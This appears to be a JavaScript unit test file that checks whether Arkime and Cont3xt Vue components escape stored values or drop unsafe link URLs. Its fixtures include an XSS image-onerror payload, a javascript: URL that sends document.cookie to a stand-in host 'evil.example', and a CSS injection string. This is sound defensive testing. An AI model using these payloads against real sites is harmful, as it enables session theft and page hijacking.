/*
Copyright Andy Wick
SPDX-License-Identifier: Apache-2.0

Unit tests that stored values reach the browser escaped or not at all. Run with
`npm run test:unit`.

The APIs check hunt searchType/type and cont3xt link urls on write, but a row can be
written around them (straight to the db, or through multies), so the components that
render them must not trust them. Each test renders the real element or method out of
the .vue file with the vue compiler, server renderer and en.json.
*/
/* eslint-disable vue/one-component-per-file -- stubs for the components the templates use */
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const cjsRequire = createRequire(import.meta.url);
const { createSSRApp, h } = cjsRequire('vue');
const { renderToString } = cjsRequire('vue/server-renderer');
const { createI18n } = cjsRequire('vue-i18n');
const { parse } = cjsRequire('@vue/compiler-sfc');
const moment = cjsRequire('moment');
const drMod = cjsRequire('defang-refang');
const dr = drMod.default ?? drMod;

const root = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
const read = (file) => fs.readFileSync(path.join(root, file), 'utf8');
const { escapeHtml, commaString } = await import('../common/vueapp/vueFilters.js');
// cont3xt's @common is cont3xt/common/vueapp
const { safeUrl, parseSeconds } = await import('../cont3xt/common/vueapp/vueFilters.js');
const en = JSON.parse(read('common/vueapp/locales/en.json'));

const XSS = '<img src=x onerror="alert(document.domain)">';
const JS_URL = 'javascript:fetch("//evil.example/"+document.cookie)';

// All template elements matching, in document order
function elements (file, matches) {
  const { descriptor } = parse(read(file));
  const out = [];
  const stack = [descriptor.template.ast];
  while (stack.length) {
    const node = stack.shift();
    if (node.type === 1 && matches(node)) { out.push(node); }
    stack.push(...(node.children ?? []));
  }
  if (!out.length) { throw new Error(`no matching element in ${file}`); }
  return out;
}

// The first template element matching, as source
const element = (file, matches) => elements(file, matches)[0].loc.source;

const prop = (node, key) => node.props.find(p => p.name === 'bind' ? p.arg?.content === key : p.name === key);
const vHtml = (key) => (node) => prop(node, 'html')?.exp?.content.includes(`'hunts.${key}'`);

async function render (template, data, methods = {}, components = {}) {
  const app = createSSRApp({ template, data: () => data, methods: { escapeHtml, commaString, ...methods } });
  app.use(createI18n({ locale: 'en', legacy: false, globalInjection: true, warnHtmlMessage: false, messages: { en } }));
  for (const [tag, component] of Object.entries(components)) { app.component(tag, component); }
  app.component('IdTooltip', { props: { target: { type: String, default: '' } }, render () { return h('span', this.$slots.default?.()); } });
  app.component('VIcon', { props: { icon: { type: String, default: '' } }, render () { return h('i', { class: this.icon }); } });
  app.directive('tooltip', {});
  app.config.warnHandler = () => {};
  return renderToString(app);
}

// Options api methods out of a .vue script, with the module scope names they use
function scriptMethods (file, names, scope) {
  const { descriptor } = parse(read(file));
  const out = {};
  for (const fn of names) {
    const m = descriptor.script.content.match(new RegExp(`\\n    ${fn} \\(([^)]*)\\) \\{([\\s\\S]*?)\\n    \\},?\\n`));
    if (!m) { throw new Error(`no ${fn} in ${file}`); }
    out[fn] = new Function(...Object.keys(scope), `return function ${fn} (${m[1]}) {${m[2]}\n};`)(...Object.values(scope));
  }
  return out;
}

describe('viewer hunt v-html params', () => {
  const job = { matchedSessions: 1, searchedSessions: 2, totalSessions: 2, search: 'pw', searchType: XSS, size: 50, type: XSS, src: true };

  for (const [file, key, data] of [
    ['viewer/vueapp/src/components/hunt/HuntData.vue', 'results-searchedHtml', { localJob: job }],
    ['viewer/vueapp/src/components/hunt/HuntData.vue', 'results-examiningHtml', { localJob: job }],
    ['viewer/vueapp/src/components/hunt/Hunt.vue', 'runningJob-canViewHtml', { runningJob: job, canView: true }]
  ]) {
    test(`${path.basename(file)} ${key} escapes a stored searchType/type`, async () => {
      const html = await render(element(file, vHtml(key)), data);
      assert.ok(!html.includes('<img'), html);
      assert.ok(html.includes('&lt;img src=x'), html);
    });
  }

  test('a normal searchType and type still render', async () => {
    const ok = { ...job, searchType: 'asciicase', type: 'reassembled' };
    const searched = await render(element('viewer/vueapp/src/components/hunt/HuntData.vue', vHtml('results-searchedHtml')), { localJob: ok });
    const examining = await render(element('viewer/vueapp/src/components/hunt/HuntData.vue', vHtml('results-examiningHtml')), { localJob: ok });
    assert.match(searched, /asciicase/);
    assert.match(examining, /reassembled/);
  });

  test('no locale uses markdown bold in an Html string', () => {
    const dir = path.join(root, 'common/vueapp/locales');
    for (const file of fs.readdirSync(dir).filter(f => f.endsWith('.json'))) {
      const walk = (obj, prefix) => {
        for (const [key, value] of Object.entries(obj)) {
          if (value && typeof value === 'object') {
            walk(value, `${prefix}${key}.`);
          } else if (key.endsWith('Html')) {
            assert.ok(!value.includes('**'), `${file} ${prefix}${key}`);
          }
        }
      };
      walk(JSON.parse(fs.readFileSync(path.join(dir, file), 'utf8')), '');
    }
  });
});

describe('cont3xt stored link urls', () => {
  test('LinkGuidance never links a javascript: externalDocUrl', async () => {
    const template = parse(read('cont3xt/vueapp/src/utils/LinkGuidance.vue')).descriptor.template.content;
    const LinkGuidance = { props: ['link', 'elementId'], template, methods: { safeUrl } };
    const guidance = (externalDocUrl) => render('<link-guidance :link="link" element-id="lg-0" />',
      { link: { name: 'x', externalDocUrl, externalDocName: 'Docs' } }, {}, { LinkGuidance });
    const bad = await guidance(JS_URL);
    assert.ok(!bad.includes('javascript:'), bad);
    assert.ok(!bad.includes('mdi-information'), bad);
    const good = await guidance('https://docs.example.com/x');
    assert.equal([...good.matchAll(/href="https:\/\/docs\.example\.com\/x"/g)].length, 2, good);
    assert.ok(good.includes('mdi-information'), good);
  });

  const card = 'cont3xt/vueapp/src/components/links/LinkGroupCard.vue';
  const links = [
    { name: 'bad', url: JS_URL, itypes: ['domain'] },
    { name: 'good', url: 'https://www.virustotal.com/gui/search/${indicator}', itypes: ['domain'] }
  ];
  const card$ = (opened = [], state = {}) => {
    const vm = {
      query: 'evil.example.com',
      itype: 'domain',
      numDays: 7,
      numHours: 168,
      startDate: '2026-11-01T00:00:00Z',
      stopDate: '2026-11-03T00:00:00Z',
      getCheckedLinks: { g1: { bad: true, good: true } },
      ...state
    };
    const fakeWindow = { open: (...args) => opened.push(args) };
    const fns = scriptMethods(card, ['replaceArray', 'replaceDate', 'replaceJSON', 'getUrl', 'openAllLinks'], { moment, dr, window: fakeWindow, safeUrl, parseSeconds });
    for (const [fn, f] of Object.entries(fns)) { vm[fn] = f.bind(vm); }
    return vm;
  };

  test('LinkGroupCard never links a javascript: link url', async () => {
    const anchor = element(card, node => node.tag === 'a' && prop(node, 'href')?.exp?.content.includes('getUrl(link.url)'));
    const vm = card$();
    const methodsFor = { getUrl: vm.getUrl, safeUrl };
    const bad = await render(anchor, { link: links[0] }, methodsFor);
    assert.ok(!bad.includes('javascript:'), bad);
    const good = await render(anchor, { link: links[1] }, methodsFor);
    assert.match(good, /href="https:\/\/www\.virustotal\.com\/gui\/search\/evil\.example\.com"/);
  });

  test('LinkGroupCard Open selected only opens http(s) links, without an opener', () => {
    const opened = [];
    card$(opened).openAllLinks({ _id: 'g1', links });
    assert.deepEqual(opened, [['https://www.virustotal.com/gui/search/evil.example.com', '_blank', 'noopener']]);
  });

  test('LinkGroupCard keeps a $ in the indicator literal', () => {
    const url = card$([], { query: "a$'b$&c$$" }).getUrl('https://x.example/?q=${indicator}&y=1');
    assert.equal(url, "https://x.example/?q=a$'b$&c$$&y=1");
  });

  test('LinkGroupCard timeSnap moves the date', () => {
    const vm = card$([], { startDate: '2026-10-15T12:00:00Z' });
    assert.equal(vm.getUrl('https://x.example/?d=${start,{"format":"YYYY-MM-DD","timeSnap":"-1d"}}'), 'https://x.example/?d=2026-10-14');
    assert.equal(vm.getUrl('https://x.example/?d=${start,{"format":"YYYY-MM-DD","timeSnap":"+1w"}}'), 'https://x.example/?d=2026-10-22');
    assert.equal(vm.getUrl('https://x.example/?d=${start,{"format":"YYYY-MM-DD","timeSnap":"1w"}}'), 'https://x.example/?d=2026-10-22');
  });

  test('a stored link color is bound as one style property', () => {
    // a single CSSOM property drops an invalid value, a style string would add the declarations
    const link = { color: 'red;position:fixed;inset:0;z-index:9999' };
    for (const file of [card, 'cont3xt/vueapp/src/components/links/LinkGroupForm.vue']) {
      for (const node of elements(file, n => prop(n, 'style')?.exp?.content.includes('link.color'))) {
        const style = new Function('link', `return (${prop(node, 'style').exp.content});`)(link);
        assert.equal(Object.keys(style).length, 1, `${file} ${node.loc.source}`);
      }
    }
  });
});
